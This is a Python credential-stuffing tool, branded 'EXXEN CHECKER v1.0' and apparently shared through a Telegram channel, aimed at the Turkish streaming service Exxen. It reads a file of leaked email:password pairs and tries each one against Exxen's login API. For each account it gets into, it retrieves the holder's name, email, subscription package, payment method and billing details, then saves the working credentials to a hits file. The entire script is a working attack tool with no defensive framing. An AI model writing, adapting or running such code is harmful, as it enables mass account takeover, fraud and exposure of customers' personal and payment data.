import requests
import json
import base64
from datetime import datetime
import os
import time
from colorama import init, Fore, Style

init()

def sweetzieschick():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.MAGENTA + """
███████╗██╗  ██╗██╗  ██╗███████╗███╗   ██╗
██╔════╝╚██╗██╔╝╚██╗██╔╝██╔════╝████╗  ██║
█████╗   ╚███╔╝  ╚███╔╝ █████╗  ██╔██╗ ██║
██╔══╝   ██╔██╗  ██╔██╗ ██╔══╝  ██║╚██╗██║
███████╗██╔╝ ██╗██╔╝ ██╗███████╗██║ ╚████║
╚══════╝╚═╝  ╚═╝╚═╝  ╚══════╝╚═╝  ╚═══╝
""" + Style.RESET_ALL)
    print(Fore.YELLOW + "╔══════════════════════════════════════════╗")
    print(Fore.YELLOW + "║        " + Fore.WHITE + "EXXEN CHECKER v1.0" + Fore.YELLOW + "               ║")
    print(Fore.YELLOW + "║" + Fore.WHITE + "  Author: @layznxw7                         " + Fore.YELLOW + "║")
    print(Fore.YELLOW + "║" + Fore.WHITE + "  Telegram: @PythonWebCheckers             " + Fore.YELLOW + "║")
    print(Fore.YELLOW + "╚══════════════════════════════════════════╝" + Style.RESET_ALL)
    print()

class jesuschrist:
    def __init__(self):
        self.layznxw7 = requests.Session()
        self.layznxw7.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'tr-TR',
            'Origin': 'https://www.exxen.com',
            'Referer': 'https://www.exxen.com/'
        })

    def kontrol(self, x, y):
        try:
            z = base64.b64encode(f"{x}:{y}".encode()).decode()
            u = "https://mw-proxy.app.exxen.com/user/login"
            k = {
                "deviceDetails": {
                    "deviceName": "Chrome",
                    "deviceType": "Desktop",
                    "modelNo": "131.0.0.0",
                    "serialNo": "131.0.0.0",
                    "brand": "Chrome",
                    "os": "Windows",
                    "osVersion": "10"
                }
            }
            h = {
                'Authorization': f'Basic {z}',
                'Content-Type': 'application/json'
            }
            r = self.layznxw7.post(u, json=k, headers=h)
            if r.status_code != 200:
                return {'ok': False, 'msg': 'Geçersiz bilgiler veya ağ hatası'}
            try:
                j = r.json()
            except:
                return {'ok': False, 'msg': 'Sunucu yanıtı okunamadı'}
            if 'bearer' not in j or 'auth' not in j['bearer']:
                return {'ok': False, 'msg': 'Auth eksik'}
            t = j['bearer']['auth'].get('token')
            if not t:
                return {'ok': False, 'msg': 'Token alınamadı'}
            s = "https://mw-proxy.app.exxen.com/user/getActiveSubscriptions"
            d = {"returnLocaleDisplayName": "T"}
            hh = {
                'Authorization': f'Bearer {t}',
                'Content-Type': 'application/json'
            }
            rr = self.layznxw7.post(s, json=d, headers=hh)
            try:
                b = rr.json()
            except:
                return {'ok': True, 'msg': 'Giriş başarılı ama üyelik bilgisi alınamadı'}
            v = {
                'ok': True,
                'msg': 'Giriş başarılı',
                'uyelik': {
                    'durum': 'Premium' if any(i.get('status') == 'Active' for i in b.get('items', [])) else 'Ücretsiz',
                    'ulke': b.get('country', 'Bilinmiyor'),
                    'paket': next((i.get('displayName') for i in b.get('items', [])), 'Aktif paket yok'),
                    'odeme': b.get('paymentMethod', 'Bilinmiyor'),
                    'isim': j.get('name', 'Bilinmiyor'),
                    'email': j.get('email', 'Bilinmiyor'),
                    'tip': j.get('accountType', 'Bilinmiyor')
                }
            }
            nd = b.get('nextBillingDateTime')
            if nd:
                ndt = datetime.fromtimestamp(int(nd)).strftime('%d.%m.%Y')
                v['uyelik']['odeme_tarihi'] = ndt
                v['uyelik']['tutar'] = b.get('nextBillingAmount', 'Yok')
            return v
        except Exception as e:
            return {'ok': False, 'msg': f'Hata: {str(e)}'}

def main():
    sweetzieschick()
    print(Fore.CYAN + "🗂️ Combo dosya yolunu girin (örn: /storage/emulated/0/Download/abc.txt):" + Style.RESET_ALL)
    path = input("> ").strip()
    if not os.path.isfile(path):
        print(Fore.RED + "❌ Dosya bulunamadı!" + Style.RESET_ALL)
        return
    with open(path, 'r', encoding='utf-8') as f:
        l = f.readlines()
    print(Fore.CYAN + f"✅ {len(l)} combo bulundu. Kontrol başlıyor..." + Style.RESET_ALL)
    z = jesuschrist()
    for i, combo in enumerate(l, 1):
        combo = combo.strip()
        if ':' not in combo:
            continue
        x, y = combo.split(':', 1)
        print(Fore.YELLOW + f"[{i}/{len(l)}] {x} kontrol ediliyor..." + Style.RESET_ALL)
        r = z.kontrol(x, y)
        if r['ok']:
            print(Fore.GREEN + f"✅ Başarılı: {combo}" + Style.RESET_ALL)
            print(Fore.GREEN + f"    İsim: {r['uyelik']['isim']} | Tip: {r['uyelik']['tip']} | Durum: {r['uyelik']['durum']}" + Style.RESET_ALL)
            if r['uyelik']['durum'] == 'Premium':
                print(Fore.YELLOW + f"    Paket: {r['uyelik']['paket']} | Ödeme: {r['uyelik'].get('tutar', 'Yok')} | Tarih: {r['uyelik'].get('odeme_tarihi', '-')}" + Style.RESET_ALL)
            with open("exxenhits.txt", "a", encoding='utf-8') as f:
                f.write(combo + "\n")
        else:
            print(Fore.RED + f"❌ {combo} | {r['msg']}" + Style.RESET_ALL)
            with open("fails.txt", "a", encoding='utf-8') as f:
                f.write(combo + " | " + r['msg'] + "\n")
        time.sleep(1)

if __name__ == "__main__":
    main()